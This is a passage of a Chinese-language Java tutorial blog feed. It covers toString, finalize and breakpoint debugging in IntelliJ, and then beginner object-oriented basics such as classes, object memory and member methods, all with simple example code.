thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ToString</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Object的toString源码</span></span><br><span class="line"><span class="comment">        //(1)gitClass().getName()类的全类名【包名+类名】</span></span><br><span class="line"><span class="comment">        //(2)Integer.toHexString(hashCode()将对象的hashCode值转换成16进制字符串</span></span><br><span class="line"><span class="comment">        public String toString() &#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        return getClass().getName() + &quot;@&quot; + Integer.toHexString(hashCode());</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Monster monster = <span class="keyword">new</span> Monster(<span class="string">&quot;大王&quot;</span>,<span class="string">&quot;巡山&quot;</span>,<span class="number">20000</span>);</span><br><span class="line">        System.out.println(monster.toString());<span class="comment">//com.thestar0.object.Monster@1b6d3586</span></span><br><span class="line">        System.out.println(monster.hashCode());</span><br><span class="line"><span class="comment">//       当直接输出一个对象时，toString 方法会被默认的调用</span></span><br><span class="line">        System.out.println(monster);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monster</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String job ;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> sal ; <span class="comment">//工资</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Monster</span><span class="params">(String name, String job, <span class="keyword">double</span> sal)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.job = job;</span><br><span class="line">        <span class="keyword">this</span>.sal = sal;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    重写toSting方法，输出对象的属性</span></span><br><span class="line"><span class="comment">//    使用快捷键AIT + Insert -&gt; toString 即可</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;<span class="comment">//重写后，就不会调用子类的toString方法了，一般是把对象的属性值输出，当然程序员也可以自己定制</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Monster&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, job=&#x27;&quot;</span> + job + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, sal=&quot;</span> + sal +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="finalize-方法">finalize 方法</h2><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220228165230291.png" alt=""></p><p>当对象被回收时，系统自动调用该对象的 finalize 方法。子类可以重写该方法，做一些<strong style="color:red;">释放资源</strong>的操作</p><p>什么时候被回收：当某个对象没有任何引用时，则 jvm 就认为这个对象是一个垃圾对象，就会使用垃圾回收机制来销毁该对象，在销毁该对象前，会先调用 finalize 方法</p><p>垃圾回收机制的调用，是由系统来决定(有自己的 GC 算法), 也可以通过 System.gc() 主动触发垃圾回收机制</p><p>在实际开发中，几乎不会运用finalize方法，更多是为了面试</p><h1>断点调试(debug)</h1><h2 id="为啥需要debug">为啥需要debug</h2><ul><li>在开发中，新手程序员在查找错误的时候，这时老程序员就会温馨提示，可以用断点调试，一步一步的看源码的执行的过程，从而发现错误所在</li><li>重要提示：在断点调试过程中，是运行状态，是以对象的运行类型来执行的<ul><li>A extends B;</li><li>B b = new A();</li><li>b.xx();</li></ul></li></ul><h2 id="断点调试介绍">断点调试介绍</h2><ol><li>断点调试是指程序在某一行设置一个断点，调试时，程序运行到这一行就会停住，然后你可以一步一步往下调试，调试过程中可以看到各个变量当前的值，出错的话，调试到出错的代码行即显示错误，停下。进行分析从而找到这个bug</li><li>断点调试是程序员必须掌握的技能</li><li>断点调试也能帮助我们查看java底层源码的执行过程，提高程序员的水平</li></ol><h2 id="断点调试的快捷键">断点调试的快捷键</h2><p>F7(跳入)步入 跳入方法里</p><p>F8(跳过)步过 逐行执行代码</p><p>shift + F8（跳出） 跳出方法</p><p>F9(resume,执行到下一个断点)</p><h3 id="设置断点">设置断点</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220219134610000.png" alt=""></p><h3 id="调试界面">调试界面</h3><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/debug.gif" alt=""></p><h3 id="数组越界异常">数组越界异常</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.thestar0.debug;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Description（描述）:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@DATe</span>&amp;TIME（创建时间）: 2022/2/20 - 17:16</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Project</span>_name（项目名）: opp2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Package</span>_name（包名）: com.thestar0.debug</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>（作者）: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>（版本）: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">debug02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> []arr = &#123;<span class="number">1</span>,<span class="number">10</span>,-<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= args.length; i++) &#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220220172239890.png" alt=""></p><blockquote><p>把光标放在某个变量上，可以看到最新的数据（比如这里可以把光标放在arr数组上看第几个元素对应的值）</p></blockquote><p>还有个错误是for循环里的i&lt;=的=会导致数组越界</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220220184750822.png" alt=""></p><h3 id="debug追溯源码（提高编程思想）">debug追溯源码（提高编程思想）</h3><p>利用快捷键F7进入方法，由于F7默认不能进入jdk查看源码，不过可以按快捷键(<code>AIT+SHIFT+F7</code>)或者点击红色那个步入按钮</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220220191737398.png" alt=""></p><p>还有一种方法（修改设置,通过F7也能进入jdk查看源码）</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220220191940095.png" alt=""></p><p>如果想要跳出方法，快捷键是<code>SHIFT+F8</code>（跳出的是一个方法，可以继续跳）</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/debug.gif" alt="debug"></p><blockquote><p>我们可以看到sort方法是利用二分查找快排实现的</p></blockquote><h3 id="动态下断点">动态下断点</h3><p>从一个断点快速运行到另一个断点快捷键是F9</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220220193105141.png" alt=""></p><h3 id="debug追踪对象创建过程">debug追踪对象创建过程</h3><p>后面再写，进入高级了</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java面向对象(初级)</title>
      <link href="//36352759.html"/>
      <url>//36352759.html</url>
      
        <content type="html"><![CDATA[<h1>面向对象(初级)（oop）</h1><p>类（程序员自己定义的数据类型）</p><p>通过类可以创建各种各样的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/1/24 - 01 -  - 17:54</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: PACKAGE_NAME</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用OPP面向对象解决问题*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">object</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建一只猫对象</span></span><br><span class="line">    <span class="comment">//new cat()创建一只猫对象</span></span><br><span class="line"><span class="comment">//    cat cat1 = new cat();把创建的猫赋给cat1,所以第一只猫叫cat1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这是一个main方法：是程序的入口：</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        cat cat1 = <span class="keyword">new</span> cat();<span class="comment">//创建第一只猫(对象)</span></span><br><span class="line">        cat1.name = <span class="string">&quot;小白&quot;</span>;</span><br><span class="line">        cat1.age = <span class="number">3</span>;</span><br><span class="line">        cat1.color = <span class="string">&quot;白色&quot;</span>;</span><br><span class="line">        cat1.weight = <span class="number">12.1</span>;</span><br><span class="line">        cat cat2 = <span class="keyword">new</span> cat();<span class="comment">//创建第二只猫（对象）</span></span><br><span class="line">        cat2.name = <span class="string">&quot;小花&quot;</span>;</span><br><span class="line">        cat2.age = <span class="number">100</span>;</span><br><span class="line">        cat2.color = <span class="string">&quot;花色&quot;</span>;</span><br><span class="line"><span class="comment">//        怎么访问对象的属性呢</span></span><br><span class="line">        System.out.println(<span class="string">&quot;第一只猫的信息&quot;</span> + cat1.name + <span class="string">&quot; &quot;</span> + cat1.age + <span class="string">&quot; &quot;</span> + cat1.color + <span class="string">&quot; &quot;</span> + cat1.weight);</span><br><span class="line">        System.out.println(<span class="string">&quot;第一只猫的信息&quot;</span> + cat2.name + <span class="string">&quot; &quot;</span> + cat2.age + <span class="string">&quot; &quot;</span> + cat2.color);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    String color;</span><br><span class="line">    <span class="keyword">double</span> weight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220124182012450.png" alt=""></p><h2 id="对象在内存中的存在形式">对象在内存中的存在形式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat cat1 = new cat();</span><br><span class="line">String name = &quot;小白&quot;;</span><br><span class="line">int age = 10;</span><br><span class="line">String color = &quot;白色&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220124183955569.png" alt=""></p><p>属性 （也叫成员变量）有的叫field(字段)</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220124184531855.png" alt=""></p><p>属性可以是基本数据类型，也可以是引用数据类型（数组和对象）</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220124184922574.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/1/24 - 01 -  - 18:53</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: PACKAGE_NAME</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Properties</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这是一个main方法：是程序的入口：</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//创建一个Person对象</span></span><br><span class="line"><span class="comment">//        person1是对象名(对象的引用</span></span><br><span class="line"><span class="comment">//        new Person() 创建的对象空间（数据）这才是真正的对象</span></span><br><span class="line">     Person  person1  = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">//     对象的属性默认值，遵守数组规则：</span></span><br><span class="line">        System.out.println(<span class="string">&quot;当前这个人的信息：&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;age: &quot;</span> + person1.age + <span class="string">&quot;name: &quot;</span> + person1.name + <span class="string">&quot;sal: &quot;</span> + person1.sal + <span class="string">&quot;inPass: &quot;</span> + person1.isPass);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">double</span> sal;</span><br><span class="line">    <span class="keyword">boolean</span> isPass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="创建对象两种方法">创建对象两种方法</h2><p>第一种：先创建，然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cat cat;</span><br><span class="line">cat = new Cat();</span><br></pre></td></tr></table></figure><p>第二种：直接创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cat cat = new cat();</span><br></pre></td></tr></table></figure><h2 id="类和对象的内存分配机制">类和对象的内存分配机制</h2><p>java内存的结构分析</p><ol><li>栈： 一般存放基本数据类型（局部变量）</li><li>堆： 存放对象（Cat cat,数组等）</li><li>方法区：常量池（常量,字符串）,类加载信息</li><li>示意图：Cat[name,age等]</li></ol><p>Java创建对象的流程简单分析</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220125001756193.png" alt=""></p><h2 id="方法调用机制">方法调用机制</h2><ol><li><p>当程序执行到方法时，就会开辟一个独立的空间（栈空间）</p></li><li><p>当一个方法执行完毕，或者执行到return语句时，就会返回</p></li><li><p>返回到调用方法的的地方</p></li><li><p>返回后，继续执行剩下的代码</p></li><li><p>当主方法main(main栈)执行完毕，整个程序退出</p></li></ol><h2 id="成员方法的好处">成员方法的好处</h2><ul><li>提高代码的复用性</li><li>可以将实现的细节封装起来，然后供其他用户来调用</li></ul><h2 id="成员方法的定义">成员方法的定义</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public（访问修饰符） 返回数据类型 方法名（形参列表……）&#123;//方法体</span><br><span class="line">  语句；</span><br><span class="line">  return 返回值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>形参列表：表示成员方法输入 <code>getSum（int num1,int num2）</code></li><li>返回数据类型：表示成员方法输出，数据类型为void 表示没有返回值</li><li>方法主体 :表示为了实现某一功能代码块</li><li>return语句不是必须的（void的时候就不用）</li></ol><h2 id="成员方法注意事项和使用细节">成员方法注意事项和使用细节</h2><blockquote><p>访问修饰符（作用是控制方法使用的范围）</p><p>有四种[1.不写(默认访问),2.public,3.private,4protected]</p></blockquote><blockquote><p>返回数据类型</p><ol><li>一个方法最多有一个返回值（可以通过数组返回多个返回值，就是返回数据类型是数组）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/1/25 - 01 -  - 1:13</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: PACKAGE_NAME</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mythod3</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这是一个main方法：是程序的入口：</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        AA aa = <span class="keyword">new</span> AA();</span><br><span class="line">        <span class="keyword">int</span>[]c = aa.a(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line">        System.out.println(c[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(c[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[]a(<span class="keyword">int</span> num1,<span class="keyword">int</span> num2)&#123;</span><br><span class="line">        <span class="keyword">int</span>[]b = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">        b[<span class="number">0</span>] = num1 + num2;</span><br><span class="line">        b[<span class="number">1</span>]  = num1 - num2;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>返回类型可以为任何类型，包含基本类型或者引用类型（数组和对象）</li><li>如果方法要求有返回数据类型，则方法体中最后的执行语句必须为 return 值; 而且要求返回值类型必须和 return 的 值类型一致或兼容</li><li>如果方法是 void，则方法体中可以没有 return 语句，或者只写 return ;</li></ol><p>方法名：遵循驼峰命名法，最好见名知意，表达出该功能的意思即可, 比如得到两个数的和 getSum, 开发中按照规范</p><p>实际开发中，我们的方法都是为了完成某个功能，所以方法名一定要有含义，最好是见名知意</p></blockquote><blockquote><p>参数列表</p><ol><li>一个方法可以有0个参数，也可以有多个参数，中间用逗号隔开，比如<code>getSum(int n1,int n2,int n3)</code></li><li>参数类型可以为任意类型，包含基本类型和引用类型（数组和对象），比如<code>printArr(int[][] map)</code></li><li>调用带参数的方法时，一定对应着参数列表传入相同类型或者兼容类型的参数！</li><li>方法定义时的参数称为形式参数，简称形参；方法调用时传入的参数称为实际参数，简称实参，实参和形参的类型要一致兼容，个数和顺序必须一致</li></ol><p>方法体</p><p>里面写完成功能的具体的语句，可以为输入，输出，变量，运算，分支，循环，方法调用，但里面不能定义方法！即方法不能嵌套定义，可以嵌套使用但不能嵌套定义</p></blockquote><blockquote><p>方法调用细节说明</p><ol><li>同一个类中的方法调用：直接调用即可。比如print(参数)；</li></ol><p>eg：A类sayOK调用print()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/1/25 - 01 -  - 2:02</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: PACKAGE_NAME</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tao</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这是一个main方法：是程序的入口：</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    A a = <span class="keyword">new</span> A();</span><br><span class="line">    a.sayOK();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="comment">//同一个类中的方法调用即可</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;print方法被调用 n=&quot;</span>+ n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayOK</span><span class="params">()</span></span>&#123;</span><br><span class="line">        print(<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;继续执行sayOK()~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>跨类中的方法A类调用B类方法：需要通过对象名调用。比如对象名.方法名（参数）</li></ol><p>eg: B类sayHello调用print()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Auther</span>: thestar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2022/1/25 - 01 -  - 2:02</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: PACKAGE_NAME</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tao</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这是一个main方法：是程序的入口：</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    A a = <span class="keyword">new</span> A();</span><br><span class="line">    a.sayOK();</span><br><span class="line">    a.m1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="comment">//同一个类中的方法调用即可</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;print方法被调用 n=&quot;</span>+ n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayOK</span><span class="params">()</span></span>&#123;</span><br><span class="line">        print(<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;继续执行sayOK()~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//跨类中的方法A类调用B类方法：需要通过对象名调用</span></span><br><span class="line">    <span class="comment">//在调用方法里面创建被调用方法所在类的对象，然后再调用方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mi()方法被调用~~~&quot;</span>);</span><br><span class="line">        <span class="comment">//先创建B对象,然后再调用方法即可</span></span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        b.hi();</span><br><span class="line">        System.out.println(<span class="string">&quot;mi()方法被执行~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hi</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;B类中的hi()被执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>跨类的方法调用和方法的访问修饰符相关</li></ol></blockquote><h2 id="写方法时候的思路">写方法时候的思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//方法思路</span><br><span class="line">    